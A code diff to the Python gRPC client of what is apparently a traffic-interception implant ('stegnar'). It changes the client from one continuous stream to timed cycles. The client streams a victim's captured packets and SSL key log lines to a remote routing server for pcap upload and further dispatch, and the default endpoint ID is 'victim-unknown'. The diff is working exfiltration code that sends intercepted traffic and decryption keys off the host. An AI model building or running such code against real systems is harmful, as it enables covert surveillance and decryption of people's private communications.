@@ -1,14 +1,17 @@
 """
-grpc_client.py — Unidirectional gRPC stream client to the Routing System.
+grpc_client.py — Periodic-cycle gRPC stream client to the Routing System.
 
-Opens a persistent HTTP/2 connection and streams PayloadChunk messages
-from the local packet + key queues. Handles reconnection on failure.
+Design change: Instead of one infinite stream, the client operates in
+CYCLES of CYCLE_DURATION seconds:
+  1. Open gRPC channel
+  2. Stream all captured packets from the queue for CYCLE_DURATION seconds
+  3. Close the channel (triggers StreamPayload to return on routing side)
+  4. Routing system then processes the closed stream: flushes endpoint_registry,
+     hash_cache, pcap upload, CALPA dispatch
+  5. Wait RECONNECT_WAIT seconds, then repeat
 
-Flow:
-  - Reads CapturedPacket objects from pkt_queue
-  - Reads SSL key lines from key_queue  (drained into a buffer per chunk)
-  - Builds a PayloadChunk proto message
-  - Streams it to the Router's StreamPayload RPC
+This guarantees streams are processed regularly and endpoint_registry
+stays current.
 """
 
 import asyncio
@@ -31,8 +34,8 @@ logger = logging.getLogger("stegnar.grpc_client")
 
 ROUTER_ADDR    = os.environ.get("ROUTER_GRPC_ADDR", "routing:50051")
 ENDPOINT_ID    = os.environ.get("ENDPOINT_ID",       "victim-unknown")
-RECONNECT_WAIT = 5   # seconds before reconnect attempt
-BATCH_TIMEOUT  = 0.05  # seconds to drain key_queue into each chunk
+RECONNECT_WAIT = 3    # seconds between cycles
+CYCLE_DURATION = 20   # seconds per streaming cycle (then disconnect so routing flushes)
 
 
 async def stream_to_router(
@@ -41,33 +44,60 @@ async def stream_to_router(
     stop_event: asyncio.Event,
 ):
     """
-    Main loop: connects to router, streams payloads, reconnects on error.
+    Main loop: cyclic connect → stream → disconnect → repeat.
+    Each completed cycle causes routing's StreamPayload RPC to return,
+    flushing endpoint_registry, hash_cache, and CALPA dispatch.
     """
+    cycle = 0
     while not stop_event.is_set():
+        cycle += 1
         try:
-            await _stream_session(pkt_queue, key_queue, stop_event)
+            chunks_sent = await _stream_cycle(pkt_queue, key_queue, stop_event, cycle)
+            logger.info(
+                "[gRPC] Cycle %d complete — sent %d chunks — sleeping %ds before next cycle",
+                cycle, chunks_sent, RECONNECT_WAIT,
+            )
         except grpc.aio.AioRpcError as e:
-            logger.warning("gRPC stream error: %s — reconnecting in %ds", e, RECONNECT_WAIT)
+            logger.warning("[gRPC] Cycle %d gRPC error: %s — retry in %ds", cycle, e, RECONNECT_WAIT)
         except Exception as e:
-            logger.error("Unexpected error in stream session: %s", e, exc_info=True)
+            logger.error("[gRPC] Cycle %d unexpected error: %s", cycle, e, exc_info=True)
 
         if not stop_event.is_set():
             await asyncio.sleep(RECONNECT_WAIT)
 
 
-async def _stream_session(
+async def _stream_cycle(
     pkt_queue: asyncio.Queue,
     key_queue: asyncio.Queue,
     stop_event: asyncio.Event,
-):
-    """Single gRPC session: opens channel, streams until disconnected or stopped."""
-    logger.info("Connecting to router at %s ...", ROUTER_ADDR)
+    cycle: int,
+) -> int:
+    """
+    Single timed cycle: open channel, stream packets for CYCLE_DURATION seconds,
+    then close channel so routing processes the stream.
+    Returns number of chunks sent.
+    """
+    logger.info("[gRPC] Cycle %d — connecting to %s ...", cycle, ROUTER_ADDR)
+
+    chunks_sent = 0
+    cycle_deadline = time.monotonic() + CYCLE_DURATION
+
     async with aio.insecure_channel(ROUTER_ADDR) as channel:
         stub = pb_grpc.RouterServiceStub(channel)
 
         async def _chunk_generator():
+            nonlocal chunks_sent
+
             while not stop_event.is_set():
-                # Wait for next captured packet
+                # Stop streaming when cycle time is up (disconnect forces routing to flush)
+                if time.monotonic() >= cycle_deadline:
+                    logger.debug(
+                        "[gRPC] Cycle %d — CYCLE_DURATION reached (%ds), closing stream (%d chunks sent)",
+                        cycle, CYCLE_DURATION, chunks_sent,
+                    )
+                    return
+
+                # Wait for next captured packet (1s timeout to check deadline)
                 try:
                     pkt: CapturedPacket = await asyncio.wait_for(
                         pkt_queue.get(), timeout=1.0
@@ -84,8 +114,7 @@ async def _stream_session(
                 except asyncio.QueueEmpty:
                     pass
 
-                # Normalize stream_id to be direction-agnostic so that both
-                # the outbound request and inbound response are buffered together.
+                # Normalize stream_id (direction-agnostic)
                 ep_a = f"{pkt.src_ip}:{pkt.src_port}"
                 ep_b = f"{pkt.dst_ip}:{pkt.dst_port}"
                 if (pkt.dst_port in (80, 443)) or ep_a > ep_b:
@@ -105,11 +134,18 @@ async def _stream_session(
                     dst_port    = pkt.dst_port,
                     captured_at = pkt.captured_at,
                 )
+                chunks_sent += 1
+                logger.debug(
+                    "[gRPC] Cycle %d chunk %d: stream=%s src=%s:%d dst=%s:%d bytes=%d",
+                    cycle, chunks_sent, stream_id,
+                    pkt.src_ip, pkt.src_port, pkt.dst_ip, pkt.dst_port, len(pkt.raw_bytes),
+                )
                 yield chunk
 
-        logger.info("gRPC stream open to router.")
         ack: pb.StreamAck = await stub.StreamPayload(_chunk_generator())
         logger.info(
-            "Stream closed by router: ok=%s chunks_recv=%d msg=%s",
-            ack.ok, ack.chunks_recv, ack.message
+            "[gRPC] Cycle %d ACK — ok=%s chunks_recv=%d msg=%s",
+            cycle, ack.ok, ack.chunks_recv, ack.message,
         )
+
+    return chunks_sent
